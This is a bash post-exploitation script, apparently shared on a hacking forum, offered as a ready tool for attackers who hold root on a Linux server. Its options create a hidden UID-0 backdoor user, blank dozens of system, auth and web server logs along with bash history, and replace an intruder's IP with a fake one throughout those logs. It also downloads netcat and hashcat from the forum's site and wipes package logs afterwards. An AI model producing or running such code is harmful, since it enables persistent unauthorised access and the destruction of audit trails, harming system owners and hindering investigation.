#!/bin/bash
#Coded By Codeine
#Visit http://infosecforums.com For Updates
#Or If You Have Input
#
#Version: 1.2
#
#Send Any Problems To f3codeine@yahoo.com Or Visit Site Above
#
################################################################
clear
echo "#########Overdose Shell Script############"
echo "# _____       _    ______            _   # "
echo "#|  __ \     | |   | ___ \          | |  # "
echo "#| |  \/ ___ | |_  | |_/ /___   ___ | |_ # "
echo "#| | __ / _ \| __| |    // _ \ / _ \| __|# "
echo "#| |_\ \ (_) | |_  | |\ \ (_) | (_) | |_ #"
echo "# \____/\___/ \__| \_| \_\___/ \___/ \__|#"
echo "################By Codeine################"
if [ "$(id -u)" != "0" ]; then
   echo ">You Must Run As Root<" 1>&2
   exit 1
fi
echo "Usage $0 [option]"
echo ""
echo ""
if [ "$1" == "--help"  ] || [ "$1" == "" ]; then
	echo "Usage $0 [option]"
	echo "--help  Displays List Of Options"
	echo "--packages  Install Various Packages(Run For List)"
	echo "--addroot  Add Root User"
	echo "--spooflogs  Spoof Logs With Fake IP"
	echo "--clearlogs  Blanks Out Logs"
	echo "--support  Gather Tats To Help Support The Project"
	exit
elif [ "$1" == "--addroot" ]; then
	echo "[*]Enter Username: "
	read rusername
	useradd -u 0 -o -g 0 -G 0,1,2,3,4,6,10 -M $rusername
	echo "$rusername Was Created"
	echo "[*]Set Password: "
	passwd $rusername
	exit
elif [ "$1" == "--clearlogs" ]; then
	echo "[*]Clearning Logs..."
	echo "------------------------------------"
#Clears 32 Different Logs
	blanklog() {
		if [ -f ${1} ]; then
			echo ""
			echo "--[*]Cleared ${1}"
			echo "" > ${1}
			if [ -f ${1}.1 ]; then
				echo "--[*]Cleared ${1} Backup"
				echo "" > ${1}.1
			fi
		fi
	}
	blanklog /var/log/lastlog
	blanklog /var/log/syslog
	blanklog /var/log/syslog
	blanklog /var/log/messages
	blanklog /var/log/httpd/access_log
	blanklog /var/log/httpd/access.log
	blanklog /var/log/httpd/error_log
	blanklog /var/log/httpd/error.log
	blanklog /var/log/apache2/access_log
	blanklog /var/log/apache2/access.log
	blanklog /var/log/apache2/error.log
	blanklog /var/log/apache2/error_log
	blanklog /var/log/wtmp
	blanklog /var/log/secure
	blanklog /var/log/xferlog
	blanklog /var/log/auth.log
	blanklog /var/log/lighttpd/lighttpd.error.log
	blanklog /var/log/lighttpd/lighttpd.access.log
	blanklog /var/run/utmp
	blanklog /var/www/logs/access_log
	blanklog /var/www/logs/access.log
	blanklog /var/www/logs/error_log
	blanklog /var/www/logs/error.log
	blanklog /var/log/apache/access_log
	blanklog /var/log/apache/access.log
	blanklog /var/log/apache/error_log
	blanklog /var/log/apache/error.log
	blanklog /var/log/yum.log
	blanklog /etc/httpd/logs/access_log
	blanklog /etc/httpd/logs/access.log
	blanklog /etc/httpd/logs/error_log
	blanklog /etc/httpd/logs/error.log
echo ""
echo "--[*]Clearing Bash History"
echo -n > ~/.bash_history
history -c
echo "------------------------------------"
echo "[*]All Logs Cleared"
exit
elif [ "$1" == "--packages" ]; then
	echo "[*]Listing Packages.."
	echo "------------------------------------"
	echo ""
	echo "0) Install All"
	echo "1) NMAP http://nmap.org/"
	echo "2) Hashcat http://hashcat.net/"
	echo "3) Netcat http://netcat.sourceforge.net/"
	echo "Which Would You Like To Install: "
	read pinstall
	if [ "$pinstall" == "0" ] || [ "$pinstall" == "1" ] || [ "$pinstall" == "2" ] || [ "$pinstall" == "3" ]; then
		function nmapinstall {
			echo "[*]Checking If Nmap Is Installed:"
			if [ -d /usr/local/share/nmap/ ]; then
				echo "[*]Nmap Is Installed. --Version"
				nmap --version
			else
					echo "[*]Nmap Is Not Installed"
					echo "[*]Nmap Installation Will Now Commence"
					wget -c http://nmap.org/dist/nmap-5.59BETA1.tar.bz2
					bzip2 -cd nmap-5.59BETA1.tar.bz2 | tar xvf -
					cd nmap-5.59BETA1
					./configure
					make
					make install
					echo "[*]Nmap Installed. Now Cleaning Up"
					rm -r nmap-5.59BETA1
					rm nmap-5.59BETA1.tar.bz2
					if [ -f /var/log/dpkg.log ]; then
						echo "" > /var/log/dpkg.log
						if [ -f /var/log/dpkg.log.1 ]; then
							echo "" > /var/log/dpkg.log.1
						fi
					fi
			fi
		}
		function hashcatinstall {
			if [ ! -d /home/sysinstall/ ]; then
				mkdir /home/sysinstall
			fi
			if [ ! -d /home/sysinstall/hashcat/ ]; then
				cd /home/sysinstall
				wget http://infosecforums.com/uploads/hashcat.tar.gz
				tar xvfz hashcat.tar.gz
				rm hashcat.tar.gz
			else
				echo "[*]Hashcat Is Already Installed"
			fi
			
			
		}
		function netcatinstall {
			if [ ! -f /usr/local/bin/nc ]; then
				if [ ! -d /home/sysinstall/ ]; then
					mkdir /home/sysinstall
				fi
					cd /home/sysinstall
					wget http://infosecforums.com/uploads/netcat-0.7.1.tar.gz
					tar -xzf netcat-0.7.1.tar.gz
					cd netcat-0.7.1.tar.gz
					./configure
					make
					make install
					echo "[*]Netcat Installed. Now Cleaning Up"
					rm netcat-0.7.1.tar.gz
					rm netcat-0.7.1
					if [ -f /var/log/dpkg.log ]; then
						echo "" > /var/log/dpkg.log
						if [ -f /var/log/dpkg.log.1 ]; then
							echo "" > /var/log/dpkg.log.1
						fi
					fi
			else
				echo "[*]Netcat Is Already Installed"
			fi
			
		}
		if [ "$pinstall" == "1" ]; then
			nmapinstall
		elif [ "$pinstall" == "2" ]; then
			hashcatinstall
		elif [ "$pinstall" == "3" ]; then
			netcatinstall
		elif [ "$pinstall" == "0" ]; then
			nmapinstall
			hashcatinstall
			netcatinstall
		fi
	else
		echo "Please Enter A Valid Package Number"
		exit
	fi
elif [ "$1" == "--spooflogs" ]; then
	echo "[*]IP To Replace: "
	read realip
	echo "[*]IP To Replace With: "
	read fakeip
	echo ""
	echo "[*]Spoofing Logs..."
	echo "------------------------------------"
	spooflog() {
		if [ -f ${1} ]; then
			echo ""
			echo "--[*]Spoofed ${1}"
			sed -i "s/$realip/$fakeip/g" ${1}
			if [ -f ${1}.1 ]; then
				echo "--[*]Spoofed ${1} Backup"
				sed -i "s/$realip/$fakeip/g" ${1}.1
			fi
		fi
	}
	spooflog /var/log/lastlog
	spooflog /var/log/syslog
	spooflog /var/log/syslog
	spooflog /var/log/messages
	spooflog /var/log/httpd/access_log
	spooflog /var/log/httpd/access.log
	spooflog /var/log/httpd/error_log
	spooflog /var/log/httpd/error.log
	spooflog /var/log/apache2/access_log
	spooflog /var/log/apache2/access.log
	spooflog /var/log/apache2/error.log
	spooflog /var/log/apache2/error_log
	spooflog /var/log/wtmp
	spooflog /var/log/secure
	spooflog /var/log/xferlog
	spooflog /var/log/auth.log
	spooflog /var/log/lighttpd/lighttpd.error.log
	spooflog /var/log/lighttpd/lighttpd.access.log
	spooflog /var/run/utmp
	spooflog /var/www/logs/access_log
	spooflog /var/www/logs/access.log
	spooflog /var/www/logs/error_log
	spooflog /var/www/logs/error.log
	spooflog /var/log/apache/access_log
	spooflog /var/log/apache/access.log
	spooflog /var/log/apache/error_log
	spooflog /var/log/apache/error.log
	spooflog /var/log/yum.log
	spooflog /etc/httpd/logs/access_log
	spooflog /etc/httpd/logs/access.log
	spooflog /etc/httpd/logs/error_log
	spooflog /etc/httpd/logs/error.log
	echo "------------------------------------"
	echo "[*]Logs Spoofed"
elif [ "$1" == "--support" ]; then
	echo "[*]If you would like to support the production of this script,"
	echo "[*]Email the following stats to f3codeine@yahoo.com"
	echo "[*]Server mailer may not send which is why I ask for manual email"
	echo "-----------Stats I Would Like----------------"
	echo "ls /usr/bin"
	echo "[*]This will display installed applications, warning this will display alot of files & dirs."
	echo ""
	echo "ls /var/log"
	echo "[*]This is the defualt location for logs."
	echo "-----------------------------------------------"
	echo ""
	echo "[*]I would very much appreciate if you ran those list commands and sent me the results"
	echo "[*]If you want to see this script develope more its a simple task to help out."
fi
##End of file: Visit http://infosecforums.com


